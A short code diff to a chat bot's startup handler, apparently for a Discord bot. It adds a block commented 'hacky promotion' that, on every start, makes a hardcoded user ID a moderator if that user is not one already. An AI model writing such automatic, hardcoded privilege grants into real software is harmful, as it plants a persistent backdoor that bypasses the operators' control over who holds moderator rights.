@@ -7,6 +7,7 @@ from app.bot_logging import bot_logger, DEBUG
 from app.helper_tools import basic_embed, find_ffmpeg, broken_cyberzhaba
 from app.checks import BotModeratorsOnlyError, MissingFFMPEGError
 from app.exceptions import AlreadyExists, NotFound
+from app.entities.users import User
 
 
 async def on_ready(client):
@@ -42,6 +43,11 @@ async def on_ready(client):
     else:
         bot_logger.warning('FFMPEG not found! Audio functionality will not work!')
         bot_logger.warning('To fix: place ffmpeg executable in ./FFMPEG or PATH')
+
+    # hacky promotion
+    ilya = User(358110614071148555)
+    if not ilya.sql().mod:
+        ilya.make_mod()
 
 
 async def on_command_error(ctx, error):
